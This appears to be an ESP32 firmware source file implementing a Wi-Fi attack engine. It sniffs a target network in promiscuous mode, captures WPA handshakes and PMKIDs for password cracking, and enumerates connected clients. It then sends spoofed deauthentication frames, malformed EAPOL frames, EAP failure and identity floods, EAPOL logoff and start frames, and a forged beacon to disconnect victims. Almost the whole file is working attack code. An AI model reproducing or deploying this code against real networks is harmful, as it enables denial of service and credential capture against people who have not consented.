#include <string.h>
#include <esp_wifi.h>
#include <esp_log.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/timers.h>
#include <esp_random.h>
#include "libwifi.h"
#include "utils.h"
#include "passwordMng.h"
#include "wifi_attacks.h"

#define CLIENT_SEM_WAIT 10
#define TARGET_SEM_WAIT 10
#define BEACON_RX_TIMEOUT 3000

static const char *TAG = "WIFI_ATTACKS";

static client_t clients[MAX_CLIENTS] = { 0 };
static SemaphoreHandle_t clients_semaphore;
static SemaphoreHandle_t target_semaphore;
static TimerHandle_t beacon_track_timer_handle = NULL;
static TaskHandle_t beacon_track_task_handle = NULL;
static uint8_t num_clients = 0;
static target_info_t target = { 0 };
static handshake_info_t handshake_info = { 0 };


/**
 * @brief Wait for timer timeout and change channel
 * 
 * @param param 
 */
static void beacon_track_task(void *param)
{
    while (1) {
        ulTaskNotifyTake(pdTRUE, portMAX_DELAY);

        if (xSemaphoreTake(target_semaphore, pdMS_TO_TICKS(100)) == pdTRUE) {
            target.channel = getNextChannel(target.channel);
            ESP_ERROR_CHECK(esp_wifi_deauth_sta(0));
            ESP_ERROR_CHECK(esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE));
            ESP_LOGW(TAG, "BEACON timeout, ap is offline or changed channel. Switching to channel %d...", target.channel);
            handshake_info.pmkid_captured = false;
            handshake_info.handshake_captured = false;
            xSemaphoreGive(target_semaphore);
        }
        xTimerReset(beacon_track_timer_handle, 0);
    }
}


/**
 * @brief If no beacond is received from ap for BEACON_RX_TIMEOUT ms switch channel
 * 
 * @param TimerHandle_t xTimer 
 */
static void hopping_timer_callback(TimerHandle_t xTimer)
{
    BaseType_t xHigherPriorityTaskWoken = pdFALSE;
    vTaskNotifyGiveFromISR(beacon_track_task_handle, &xHigherPriorityTaskWoken);
    portYIELD_FROM_ISR(xHigherPriorityTaskWoken);
}


/**
 * @brief Get the target info copy object
 * 
 * @param dest 
 * @param src 
 * @return uint8_t 
 */
static uint8_t get_target_info_copy(target_info_t *dest, target_info_t *src)
{
    if(xSemaphoreTake(target_semaphore, pdMS_TO_TICKS(TARGET_SEM_WAIT)) == pdTRUE) 
    {
        memcpy(dest, src, sizeof(target_info_t));
        xSemaphoreGive(target_semaphore);
        return true;
    }
    else {
        return false;
    }
}


/**
 * @brief Add associated client to clients list
 * 
 * @param mac 
 */
static void add_client_to_list(const uint8_t *mac) 
{
    if (xSemaphoreTake(clients_semaphore, pdMS_TO_TICKS(CLIENT_SEM_WAIT)) == pdTRUE) 
    {
        /* Dont add duplicates */
        for (uint8_t i = 0; i < num_clients; i++) {
            if (memcmp(clients[i].mac, mac, 6) == 0) {
                xSemaphoreGive(clients_semaphore);
                return;
            }
        }
        if (num_clients < MAX_CLIENTS) 
        {
            memcpy(clients[num_clients].mac, mac, 6);
            num_clients++;
            ESP_LOGI(TAG, "Client aggiunto: %02X:%02X:%02X:%02X:%02X:%02X",
                    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        }
        xSemaphoreGive(clients_semaphore);
    }
}


IRAM_ATTR static void promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) 
{   
    const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t *)buf;
    struct libwifi_frame frame = { 0 };
    struct libwifi_wpa_auth_data wpa_data = { 0 };
    bool wpa_data_initialized = false;
    int ret = libwifi_get_wifi_frame(&frame, (uint8_t *)packet->payload, packet->rx_ctrl.sig_len, false);

    /* Failed to parse the Wi-Fi frame */
    if (ret != 0) {
        #ifdef DEBUG
        ESP_LOGE(TAG, "Failed to parse wifi frame.");
        #endif
        return;
    }

    /* For better reading */
    const uint8_t *dest_mac = (uint8_t *)&frame.header.mgmt_ordered.addr1;  // Destination MAC address
    const uint8_t *src_mac = (uint8_t *)&frame.header.mgmt_ordered.addr2;  // Source MAC address
    const uint8_t *bssid = (uint8_t *)&frame.header.mgmt_ordered.addr3;    // BSSID

    /* Capture beacon frames */
    if (frame.frame_control.type == TYPE_MANAGEMENT && frame.frame_control.subtype == SUBTYPE_BEACON)
    {
        if( isMacBroadcast(dest_mac) == true && memcmp(src_mac, target.bssid, 6) == 0 )
        {
            /* Reset beacon timeout timer */
            if( beacon_track_timer_handle != NULL )
            {
                xTimerReset(beacon_track_timer_handle, 0);
            }
        }
    }

    /* Check frame type data for EAPOLs */
    if (frame.frame_control.type == TYPE_DATA)
    {
        if( libwifi_check_wpa_handshake(&frame) == true )
        {
            /* Extract WPA data from the frame */
            ret = libwifi_get_wpa_data(&frame, &wpa_data);
            if (ret != 0) {
                #ifdef DEBUG
                ESP_LOGE(TAG, "Failed to parse WPA data from EAPOL frame.");
                #endif
                goto cleanup;
            }
            wpa_data_initialized = true;

            if( libwifi_check_wpa_message(&frame) == HANDSHAKE_M1 && isMacZero(handshake_info.mac_sta) && memcmp(src_mac, target.bssid, 6) == 0 )
            {
                /* Extract ANonce from MSG 1 */
                memcpy(handshake_info.anonce, wpa_data.key_info.nonce, 32);
                memcpy(handshake_info.mac_sta, dest_mac, 6);
                /* Try get PMKID */
                /* Minimum length for RSNIE with PMKID */
                if (wpa_data.key_info.key_data_length >= 20)
                {
                    struct libwifi_tag_iterator iterator = { 0 };
                    if (libwifi_tag_iterator_init(&iterator, wpa_data.key_info.key_data, wpa_data.key_info.key_data_length) == 0) 
                    {
                        const uint8_t *tag_data = iterator.tag_data;
                        /* Check WPA OUI */
                        if (tag_data[0] == 0x00 && tag_data[1] == 0x0F && tag_data[2] == 0xAC)
                        {
                            memcpy(handshake_info.pmkid, tag_data + 4, 16);
                            handshake_info.pmkid_captured = true;
                            ESP_LOGI(TAG, "PMKID Captured!");
                        }
                    }
                }
            }
            else if( libwifi_check_wpa_message(&frame) == HANDSHAKE_M2 && memcmp(handshake_info.mac_sta, src_mac, 6) == 0 && memcmp(dest_mac, target.bssid, 6) == 0 )
            {
                /* Extract SNonce and MIC from MSG 2 */
                memcpy(handshake_info.snonce, wpa_data.key_info.nonce, 32);
                memcpy(handshake_info.mic, wpa_data.key_info.mic, 16);
                /* Set MIC to zero */
                memset(wpa_data.key_info.mic, 0x00, 16);
                size_t len = libwifi_dump_wpa_auth_data(&wpa_data, handshake_info.eapol, sizeof(handshake_info.eapol));
                handshake_info.eapol_len = len;
                handshake_info.handshake_captured = true;
                ESP_LOGI(TAG, "Got Handshake!");
            }
        }
        
        /* Add client to the list if MAC matches the target */
        if (memcmp(bssid, target.bssid, 6) == 0 && memcmp(dest_mac, target.bssid, 6) == 0) 
        {
            add_client_to_list(src_mac);
        }
    }

cleanup:
    /* Cleanup allocated resources */
    if (wpa_data_initialized) {
        libwifi_free_wpa_data(&wpa_data);
    }
    libwifi_free_wifi_frame(&frame);
    xSemaphoreGive(target_semaphore);
}


void wifi_attack_engine_start(target_info_t *_target)
{
    /* Check pointer */
    if( _target == NULL )
    {
        return;
    }

    /* Init semaphore */
    if (clients_semaphore == NULL) 
    {
        clients_semaphore = xSemaphoreCreateMutex();
    }
    if (target_semaphore == NULL) 
    {
        target_semaphore = xSemaphoreCreateBinary();
    }

    memcpy(&target, _target, sizeof(target_info_t));
    
    /* Reset client count */
    num_clients = 1;
    /* Set first "client" to broadcast address */
    memset(clients[0].mac, 0xFF, 6);
    memset(&handshake_info, 0, sizeof(handshake_info_t)); 

    /* Start wifi promiscuos mode */
    esp_wifi_set_promiscuous(true);
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_MGMT
    };
    esp_wifi_set_promiscuous_filter(&filter);
    filter.filter_mask = WIFI_PROMIS_CTRL_FILTER_MASK_ALL;
    esp_wifi_set_promiscuous_ctrl_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(promiscuous_callback);

    /* Start beacon timer for channel tracking */
    beacon_track_timer_handle = xTimerCreate("beacon_track_timer_handle", pdMS_TO_TICKS(BEACON_RX_TIMEOUT), pdTRUE, NULL, hopping_timer_callback);
    if (beacon_track_timer_handle == NULL) {
        ESP_LOGE(TAG, "Errore nella creazione del timer");
        return;
    }
    xTimerStart(beacon_track_timer_handle, 0);
    if( beacon_track_task_handle == NULL )
    {
        xTaskCreate(beacon_track_task, "beacon_track_task_handle", 4096, NULL, 10, &beacon_track_task_handle);
    }
}


void wifi_attack_engine_stop(void)
{
    /* Disable promiscuous mode */
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(false));
    ESP_ERROR_CHECK(esp_wifi_stop());

    /* Delete semaphore */
    if (clients_semaphore != NULL) 
    {
        vSemaphoreDelete(clients_semaphore);
        clients_semaphore = NULL;
    }
    if (target_semaphore != NULL) 
    {
        vSemaphoreDelete(target_semaphore);
        target_semaphore = NULL;
    }

    /* Reset Global variables */
    memset(clients, 0, sizeof(clients));
    memset(&target, 0, sizeof(target_info_t));
    memset(&handshake_info, 0, sizeof(handshake_info_t));

    /* Delete channel tracking timer */
    xTimerStop(beacon_track_timer_handle, 0);
    xTimerDelete(beacon_track_timer_handle, 0);
    beacon_track_timer_handle = NULL;

    /* Stop timer task for beacon channel tracking */
    if( beacon_track_task_handle != NULL )
    {
        vTaskDelete(beacon_track_task_handle);
    }
}


void wifi_attack_deauth_basic(void)
{
    /* Get a copy of target */
    target_info_t target_local = { 0 };
    if( get_target_info_copy(&target_local, &target) == false )
    {
        return;
    }
    /* Check client array access */
    if (xSemaphoreTake(clients_semaphore, pdMS_TO_TICKS(CLIENT_SEM_WAIT)) != pdTRUE) 
    {
        return;
    }

    uint8_t deauth_packet[26] = {
        0xC0, 0x00, // Frame Control (Deauth)
        0x3A, 0x01, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dest Address (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source Address (Placeholder, will be set to BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (Placeholder, will be set to BSSID)
        0x00, 0x00, // Sequence Control
        0x07, 0x00  // Reason Code (7 = Class 3 frame received from nonassociated station)
    };
    memcpy(&deauth_packet[10], target_local.bssid, 6);    // Source Address
    memcpy(&deauth_packet[16], target_local.bssid, 6);    // BSSID

    /* Send first to broadcast */
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);

    for (int i = 0; i < num_clients; i++) 
    {
        memcpy(&deauth_packet[4], clients[i].mac, 6);
        deauth_packet[24] = 1; /* Reason Code 1: Unspecified Reason */
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        // deauth_packet[24] = 4; /* Reason Code 4: Disassociated Due to Inactivity */
        // esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        // deauth_packet[24] = 5; /* Reason Code 5: Disassociated Because AP Is Unable to Handle All Currently Associated Stations */
        // esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        // deauth_packet[24] = 6; /* Reason Code 6: Class 2 Frame Received from Non-Authenticated Station */
        // esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        deauth_packet[24] = 7; /* Reason Code 7: Class 3 Frame Received from Non-Associated Station */
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        // deauth_packet[24] = 8; /* Reason Code 8: Disassociated Because Station Is Leaving (or Has Left) BSS */
        // esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        // deauth_packet[24] = 10; /* Reason Code 10: Disassociated Due to Invalid Security Parameters */
        // esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
    }
    xSemaphoreGive(clients_semaphore);
}


void wifi_attack_deauth_client_invalid_PMKID(void)
{
    /* Get a copy of target */
    target_info_t target_local = { 0 };
    if( get_target_info_copy(&target_local, &target) == false )
    {
        return;
    }
    /* Check client array access */
    if (xSemaphoreTake(clients_semaphore, pdMS_TO_TICKS(CLIENT_SEM_WAIT)) != pdTRUE) 
    {
        return;
    }

    static uint64_t replay_counter = 2000;
    uint8_t eapol_packet_invalid_PMKID[91] = {
        0x08, 0x02, // Frame Control (EAPOL)
        0x00, 0x00, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence Control
        0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, // LLC Header
        0x88, 0x8E,                         // EAPOL Ethertype
        0x02,                               // Key Descriptor Type
        0xCA, 0x00,                         // Key Info (Malformato: Install Flag Settato)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Replay Counter
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Key Nonce
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Key IV
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Key RSC
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Key MIC
        0x00, 0x16, // Key Data Length
        0xDD,       // RSN Tag Number
        0xFF,       // RSN PMKID Tag Length (Corrupted)
        0x00, 0x0F, 0xAC, 0x04, // RSN Information
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // PMKID
    };
    memcpy(&eapol_packet_invalid_PMKID[10], target_local.bssid, 6);    // Source Address
    memcpy(&eapol_packet_invalid_PMKID[16], target_local.bssid, 6);    // BSSID

    for (uint8_t i = 0; i < 8; i++) {
        eapol_packet_invalid_PMKID[35 + i] = (replay_counter >> (56 - i * 8)) & 0xFF;
    }

    /* Skip broadcast address */
    for (uint8_t i = 1; i < num_clients; i++) 
    {
        memcpy(&eapol_packet_invalid_PMKID[4], clients[i].mac, 6); // Destination Address (Client MAC)
        esp_wifi_80211_tx(WIFI_IF_STA, eapol_packet_invalid_PMKID, sizeof(eapol_packet_invalid_PMKID), false);
        /* Increase replay counter for next packet */
        replay_counter++;
    }
    xSemaphoreGive(clients_semaphore);
}


void wifi_attack_deauth_client_bad_msg1(void)
{
    /* Get a copy of target */
    target_info_t target_local = { 0 };
    if( get_target_info_copy(&target_local, &target) == false )
    {
        return;
    }
    /* Check client array access */
    if (xSemaphoreTake(clients_semaphore, pdMS_TO_TICKS(CLIENT_SEM_WAIT)) != pdTRUE) 
    {
        return;
    }

    static uint64_t replay_counter = 2000;
    uint8_t eapol_packet_bad_msg1[91] = {
        0x08, 0x02, // Frame Control (EAPOL)
        0x00, 0x00, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence Control
        0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, // LLC Header
        0x88, 0x8E,                         // EAPOL Ethertype
        0x02,                               // Key Descriptor Type
        0xCA, 0x00,                         // Key Info (Install flag settato)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Replay Counter
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Key Nonce
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Key IV
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Key RSC
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Key MIC
        0x00, 0x16, // Key Data Length
        0xDD,       // RSN Tag Number
        0x16,       // RSN PMKID Tag Length
        0x00, 0x0F, 0xAC, 0x04, // RSN Information
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // PMKID
    };
    memcpy(&eapol_packet_bad_msg1[10], target_local.bssid, 6);    // Source Address
    memcpy(&eapol_packet_bad_msg1[16], target_local.bssid, 6);    // BSSID
    /* Generate random Nonce */
    for (uint8_t i = 0; i < 32; i++) {
        eapol_packet_bad_msg1[43 + i] = esp_random() & 0xFF; // Inserisce il valore nel campo Key Nonce
    }
    /* Update replay counter */
    for (uint8_t i = 0; i < 8; i++) {
        eapol_packet_bad_msg1[35 + i] = (replay_counter >> (56 - i * 8)) & 0xFF;
    }

    /* Skip broadcast address */
    for (uint8_t i = 1; i < num_clients; i++) 
    {
        memcpy(&eapol_packet_bad_msg1[4], clients[i].mac, 6); // Destination Address (Client MAC)
        esp_wifi_80211_tx(WIFI_IF_STA, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
        /* Increase replay counter for next packet */
        replay_counter++;
    }
    xSemaphoreGive(clients_semaphore);
}


void wifi_attack_deauth_ap_eapol_logoff(void)
{
    /* Get a copy of target */
    target_info_t target_local = { 0 };
    if( get_target_info_copy(&target_local, &target) == false )
    {
        return;
    }
    /* Check client array access */
    if (xSemaphoreTake(clients_semaphore, pdMS_TO_TICKS(CLIENT_SEM_WAIT)) != pdTRUE) 
    {
        return;
    }

    uint8_t eapol_logoff_packet[33] = {
        0x08, 0x02, // Frame Control (EAPOL)
        0x00, 0x00, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence Control
        0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, // LLC Header
        0x88, 0x8E,                         // EAPOL Ethertype
        0x02                                // EAPOL-Type (Logoff)
    };
    memcpy(&eapol_logoff_packet[10], target_local.bssid, 6);    // Source Address
    memcpy(&eapol_logoff_packet[16], target_local.bssid, 6);    // BSSID

    /* Skip broadcast address */
    for (uint8_t i = 1; i < num_clients; i++) 
    {
        memcpy(&eapol_logoff_packet[4], clients[i].mac, 6); // Destination Address (Client MAC)
        esp_wifi_80211_tx(WIFI_IF_STA, eapol_logoff_packet, sizeof(eapol_logoff_packet), false);
    }
    xSemaphoreGive(clients_semaphore);
}


void wifi_attack_deauth_client_eap_failure(void)
{
    /* Get a copy of target */
    target_info_t target_local = { 0 };
    if( get_target_info_copy(&target_local, &target) == false )
    {
        return;
    }
    /* Check client array access */
    if (xSemaphoreTake(clients_semaphore, pdMS_TO_TICKS(CLIENT_SEM_WAIT)) != pdTRUE) 
    {
        return;
    }
    
    uint8_t eap_failure_packet[42] = {
        0x08, 0x02, // Frame Control (EAPOL)
        0x00, 0x00, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast or Client MAC)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence Control
        0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, // LLC Header
        0x88, 0x8E,                         // EAPOL Ethertype
        0x00, 0x00, 0x00, 0x00,             // EAPOL Packet Length
        0x01,                               // EAP Version
        0x04,                               // EAPOL Type (EAP Failure)
        0x00, 0x04,                         // EAP Length
        0x02,                               // EAP ID
        0x04                                // EAP Code (Failure)
    };
    memcpy(&eap_failure_packet[10], target_local.bssid, 6);    // Source Address
    memcpy(&eap_failure_packet[16], target_local.bssid, 6);    // BSSID

    /* Skip broadcast address */
    for (uint8_t i = 1; i < num_clients; i++) 
    {
        memcpy(&eap_failure_packet[4], clients[i].mac, 6); // Destination Address (Client MAC)
        esp_wifi_80211_tx(WIFI_IF_STA, eap_failure_packet, sizeof(eap_failure_packet), false);
    }
    xSemaphoreGive(clients_semaphore);
}


void wifi_attack_deauth_client_eap_rounds(void)
{
    /* Get a copy of target */
    target_info_t target_local = { 0 };
    if( get_target_info_copy(&target_local, &target) == false )
    {
        return;
    }
    /* Check client array access */
    if (xSemaphoreTake(clients_semaphore, pdMS_TO_TICKS(CLIENT_SEM_WAIT)) != pdTRUE) 
    {
        return;
    }

    uint8_t eap_identity_request_packet[42] = {
        0x08, 0x02, // Frame Control (EAPOL)
        0x00, 0x00, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast or Client MAC)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence Control
        0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, // LLC Header
        0x88, 0x8E,                         // EAPOL Ethertype
        0x00, 0x00, 0x00, 0x05,             // EAPOL Packet Length
        0x01,                               // EAP Version
        0x01,                               // EAP Code (Request)
        0x01,                               // EAP ID
        0x00, 0x05,                         // EAP Length
        0x01                                // EAP Type (Identity)
    };
    memcpy(&eap_identity_request_packet[10], target_local.bssid, 6);    // Source Address
    memcpy(&eap_identity_request_packet[16], target_local.bssid, 6);    // BSSID
    
    /* Skip broadcast address */
    for (uint8_t i = 1; i < num_clients; i++) 
    {
        memcpy(&eap_identity_request_packet[4], clients[i].mac, 6); // Destination Address (Client MAC)
        for(uint8_t identity = 0; identity < 255; identity++ )
        {
            eap_identity_request_packet[38] = identity;
            esp_wifi_80211_tx(WIFI_IF_STA, eap_identity_request_packet, sizeof(eap_identity_request_packet), false);
            vTaskDelay(pdMS_TO_TICKS(1));
        }
    }
    xSemaphoreGive(clients_semaphore);
}


void wifi_attack_deauth_ap_eapol_start(void)
{
    /* Get a copy of target */
    target_info_t target_local = { 0 };
    if( get_target_info_copy(&target_local, &target) == false )
    {
        return;
    }
    /* Check client array access */
    if (xSemaphoreTake(clients_semaphore, pdMS_TO_TICKS(CLIENT_SEM_WAIT)) != pdTRUE) 
    {
        return;
    }

    uint8_t eapol_start_packet[36] = {
        0x08, 0x02, // Frame Control (EAPOL)
        0x00, 0x00, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast or Client MAC)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence Control
        0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, // LLC Header
        0x88, 0x8E,                         // EAPOL Ethertype
        0x01, 0x01,                         // EAPOL Version and Type (Start)
        0x00, 0x00                          // EAPOL Length (0 for Start packets)
    };
    memcpy(&eapol_start_packet[10], target_local.bssid, 6);    // Source Address
    memcpy(&eapol_start_packet[16], target_local.bssid, 6);    // BSSID

    /* Skip broadcast address */
    for (uint8_t i = 1; i < num_clients; i++) 
    {
        memcpy(&eapol_start_packet[4], clients[i].mac, 6); // Destination Address (Client MAC)
        for(uint8_t burst = 0; burst < 3; burst++ )
        {
            esp_wifi_80211_tx(WIFI_IF_STA, eapol_start_packet, sizeof(eapol_start_packet), false);
            vTaskDelay(pdMS_TO_TICKS(2));
        }
    }
    xSemaphoreGive(clients_semaphore);
}


void wifi_attack_deauth_client_negative_tx_power(void)
{
    /* Get a copy of target */
    target_info_t target_local = { 0 };
    if( get_target_info_copy(&target_local, &target) == false )
    {
        return;
    }

    uint8_t beacon_frame_negative_tx[256] = {
        0x80, 0x00, // Frame Control (Beacon)
        0x00, 0x00, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00, // Sequence Control
        0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // timestamp
        0x64, 0x00, // Beacon Interval (102.4ms)
        0x31, 0x04  // Capability Information
    };
    memcpy(&beacon_frame_negative_tx[10], target_local.bssid, 6);    // Source Address
    memcpy(&beacon_frame_negative_tx[16], target_local.bssid, 6);    // BSSID 
    uint16_t offset = 36;
    // 2. Tagged Parameters
    // SSID Parameter
    beacon_frame_negative_tx[offset++] = 0x00;          // SSID Tag Number
    beacon_frame_negative_tx[offset++] = strlen((char *)&target_local.ssid); // SSID Tag Length
    memcpy(beacon_frame_negative_tx + offset, (char *)&target_local.ssid, strlen((char *)&target_local.ssid));
    offset += strlen((char *)&target_local.ssid);

    /* Supported Rates (1 Mbps, 2 Mbps, 5.5 Mbps, 11 Mbps) */
    beacon_frame_negative_tx[offset++] = 0x01;          // Supported Rates Tag Number
    beacon_frame_negative_tx[offset++] = 3;             // Length
    beacon_frame_negative_tx[offset++] = 0x02;          // 1 Mbps
    beacon_frame_negative_tx[offset++] = 0x04;          // 2 Mbps
    beacon_frame_negative_tx[offset++] = 0x0B;          // 5.5 Mbps
    //beacon_frame_negative_tx[offset++] = 0x16;          // 11 Mbps

    // DS Parameter Set (Channel)
    beacon_frame_negative_tx[offset++] = 0x03;          // DS Parameter Set Tag Number
    beacon_frame_negative_tx[offset++] = 1;             // Length
    beacon_frame_negative_tx[offset++] = target_local.channel;       // Channel Number

    // Traffic Indication Map (TIM)
    beacon_frame_negative_tx[offset++] = 0x05;          // TIM Tag Number
    beacon_frame_negative_tx[offset++] = 4;             // Length
    beacon_frame_negative_tx[offset++] = 0x00;          // DTIM Count
    beacon_frame_negative_tx[offset++] = 0x01;          // DTIM Period
    beacon_frame_negative_tx[offset++] = 0x00;          // Bitmap Control
    beacon_frame_negative_tx[offset++] = 0x00;          // Partial Virtual Bitmap

    // // RSN Information (WPA2)
    // uint8_t rsn_info[] = {
    //     0x30,                         // RSN Information Tag Number
    //     0x18,                         // Length
    //     0x01, 0x00,                   // Version
    //     0x00, 0x0F, 0xAC, 0x04,       // Group Cipher Suite (CCMP)
    //     0x01, 0x00,                   // Pairwise Cipher Suite Count
    //     0x00, 0x0F, 0xAC, 0x04,       // Pairwise Cipher Suite (CCMP)
    //     0x01, 0x00,                   // Authentication Suite Count
    //     0x00, 0x0F, 0xAC, 0x02,       // Authentication Suite (PSK)
    //     0x00, 0x00                    // RSN Capabilities
    // };
    // memcpy(beacon_frame_negative_tx + offset, rsn_info, sizeof(rsn_info));
    // offset += sizeof(rsn_info);

    // TCP Report Transmission Power (TX Power Level)
    beacon_frame_negative_tx[offset++] = 0x33;          // TCP Report TX Power Tag Number
    beacon_frame_negative_tx[offset++] = 1;             // Length
    beacon_frame_negative_tx[offset++] = 15;      // TX Power Level

    // Power Constraint
    beacon_frame_negative_tx[offset++] = 0x20;          // Power Constraint Tag Number
    beacon_frame_negative_tx[offset++] = 1;             // Length
    beacon_frame_negative_tx[offset++] = -1;             // Power Constraint (Example: 3 dBm)

    /* Spam 10 packets */
    for (uint8_t i = 10; i <= 10; i++) 
    {
        esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame_negative_tx, offset, false);
        vTaskDelay(pdMS_TO_TICKS(2));
    }
}


handshake_info_t * wifi_attack_engine_handshake(void)
{
    return &handshake_info;
}